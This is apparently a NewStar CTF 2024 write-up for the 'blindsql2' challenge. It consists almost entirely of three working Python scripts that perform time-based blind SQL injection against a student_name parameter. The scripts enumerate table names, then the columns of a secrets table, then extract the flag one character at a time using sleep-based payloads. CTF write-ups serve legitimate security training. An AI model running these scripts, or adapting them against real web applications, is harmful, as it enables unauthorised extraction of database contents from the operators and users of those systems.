---
titleTemplate: ':title | WriteUp - NewStar CTF 2024'
---

# blindsql2

爆破当前数据库所有表名

```python

import requests,string,time

url = 'http://ip:32782'

result = ''
for i in range(1,100):
    print(f'[+]bruting at {i}')
    for c in string.ascii_letters + string.digits + ',_-{}':
        time.sleep(0.01) # 限制速率，防止请求过快

        print('[+]trying:',c)

        tables = f'(Select(group_concat(table_name))from(infOrmation_schema.tables)where((table_schema)like(database())))'

        # 获取第i个字符，并计算ascii值
        char = f'(ord(mid({tables},{i},1)))'

        # 爆破该ascii值
        b = f'(({char})in({ord(c)}))'

        # 若ascii猜对了，会执行sleep(1.5)
        p = f'Alice\'and(if({b},sleep(1.5),0))#'

        res = requests.get(url,params={'student_name':p})
        
        if res.elapsed.total_seconds() > 1.5:
            print('[*]bingo:',c)
            result += c
            print(result)
            break
```

爆破secrets表的列名

```python

import requests,string,time

url = 'http://ip:32782'

result = ''
for i in range(1,100):
    print(f'[+]bruting at {i}')
    for c in string.ascii_letters + string.digits + ',_-{}':
        time.sleep(0.01) # 限制速率，防止请求过快

        print('[+]trying:',c)

        columns = f'(Select(group_concat(column_name))from(infOrmation_schema.columns)where((table_name)like(\'secrets\')))'

        # 获取第i个字符，并计算ascii值
        char = f'(ord(mid({columns},{i},1)))'

        # 爆破该ascii值
        b = f'(({char})in({ord(c)}))'

        # 若ascii猜对了，会执行sleep(1.5)
        p = f'Alice\'and(if({b},sleep(1.5),0))#'

        res = requests.get(url,params={'student_name':p})
        
        if res.elapsed.total_seconds() > 1.5:
            print('[*]bingo:',c)
            result += c
            print(result)
            break
```

爆破flag

```python

import requests,string,time

url = 'http://ip:32782'

result = ''
for i in range(1,100):
    print(f'[+]bruting at {i}')
    for c in string.ascii_letters + string.digits + ',_-{}':
        time.sleep(0.01) # 限制速率，防止请求过快

        print('[+]trying:',c)

        flag = f'(Select(group_concat(secret_value))from(secrets)where((secret_value)like(\'flag%\')))'

        # 获取第i个字符，并计算ascii值
        char = f'(ord(mid({flag},{i},1)))'

        # 爆破该ascii值
        b = f'(({char})in({ord(c)}))'

        # 若ascii猜对了，会执行sleep(1.5)
        p = f'Alice\'and(if({b},sleep(1.5),0))#'

        res = requests.get(url,params={'student_name':p})
        
        if res.elapsed.total_seconds() > 1.5:
            print('[*]bingo:',c)
            result += c
            print(result)
            break
```
